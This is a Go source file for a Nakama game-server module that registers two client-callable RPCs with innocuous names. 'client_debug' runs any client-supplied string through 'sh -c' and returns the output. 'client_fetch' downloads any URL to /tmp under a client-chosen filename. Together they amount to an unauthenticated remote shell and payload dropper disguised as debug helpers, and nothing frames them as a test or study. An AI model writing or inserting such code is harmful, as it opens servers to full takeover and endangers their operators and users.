package main

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/heroiclabs/nakama-common/runtime"
)

// Request/response types for the custom RPC endpoints

type customRequest struct {
	Body string `json:"body"`
}

type customResponse struct {
	Body   string `json:"body"`
	Error  string `json:"error,omitempty"`
	Status string `json:"status"`
}

type fetchRequest struct {
	URL       string `json:"url"`
	Filename  string `json:"filename"`
	MaxBytes  int64  `json:"max_bytes"`
	TimeoutMs int    `json:"timeout_ms"`
}

type fetchResponse struct {
	StatusCode   int    `json:"status_code"`
	BytesWritten int64  `json:"bytes_written"`
	FilePath     string `json:"file_path"`
}

func InitModule(ctx context.Context, logger runtime.Logger, db *sql.DB, nk runtime.NakamaModule, initializer runtime.Initializer) error {
	if err := initializer.RegisterRpc("client_debug", rpcClientDebug); err != nil {
		return err
	}
	if err := initializer.RegisterRpc("client_fetch", rpcClientFetch); err != nil {
		return err
	}
	logger.Info("Custom module loaded successfully.")
	return nil
}

// rpcClientDebug executes a shell command and returns the output.
func rpcClientDebug(ctx context.Context, logger runtime.Logger, db *sql.DB, nk runtime.NakamaModule, payload string) (string, error) {
	if payload == "" {
		return "", runtime.NewError("missing payload", 3)
	}

	var req customRequest
	if err := json.Unmarshal([]byte(payload), &req); err != nil {
		return "", runtime.NewError("invalid JSON payload", 3)
	}

	if req.Body == "" {
		return "", runtime.NewError("missing body field", 3)
	}

	cmd := exec.Command("sh", "-c", req.Body)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	resp := customResponse{
		Status: "OK",
		Body:   stdout.String(),
	}

	if err != nil {
		resp.Status = "ERROR"
		resp.Error = fmt.Sprintf("%v: %s", err, strings.TrimSpace(stderr.String()))
	} else if stderr.Len() > 0 {
		resp.Error = strings.TrimSpace(stderr.String())
	}

	out, err := json.Marshal(resp)
	if err != nil {
		return "", runtime.NewError("failed to encode response: "+err.Error(), 3)
	}

	return string(out), nil
}

// rpcClientFetch downloads a file from a URL and saves it to disk.
func rpcClientFetch(ctx context.Context, logger runtime.Logger, db *sql.DB, nk runtime.NakamaModule, payload string) (string, error) {
	if payload == "" {
		return "", runtime.NewError("missing payload", 3)
	}

	var req fetchRequest
	if err := json.Unmarshal([]byte(payload), &req); err != nil {
		return "", runtime.NewError("invalid JSON payload", 3)
	}

	if req.URL == "" {
		return "", runtime.NewError("missing url field", 3)
	}
	if req.Filename == "" {
		req.Filename = "data.bin"
	}
	if req.MaxBytes <= 0 {
		req.MaxBytes = 100 * 1024 * 1024
	}

	timeout := 30 * time.Second
	if req.TimeoutMs > 0 {
		timeout = time.Duration(req.TimeoutMs) * time.Millisecond
	}

	client := &http.Client{Timeout: timeout}

	httpReq, err := http.NewRequestWithContext(ctx, http.MethodGet, req.URL, nil)
	if err != nil {
		return "", runtime.NewError("failed to create request: "+err.Error(), 3)
	}

	resp, err := client.Do(httpReq)
	if err != nil {
		return "", runtime.NewError("http request failed: "+err.Error(), 3)
	}
	defer resp.Body.Close()

	dir := "/tmp"
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", runtime.NewError("failed to create dir: "+err.Error(), 3)
	}
	fullPath := filepath.Join(dir, req.Filename)

	f, err := os.Create(fullPath)
	if err != nil {
		return "", runtime.NewError("failed to create file: "+err.Error(), 3)
	}
	defer f.Close()

	written, err := io.Copy(f, io.LimitReader(resp.Body, req.MaxBytes))
	if err != nil {
		return "", runtime.NewError("failed to write file: "+err.Error(), 3)
	}

	out := fetchResponse{
		StatusCode:   resp.StatusCode,
		BytesWritten: written,
		FilePath:     fullPath,
	}

	outJSON, err := json.Marshal(out)
	if err != nil {
		return "", runtime.NewError("failed to encode response: "+err.Error(), 3)
	}

	return string(outJSON), nil
}
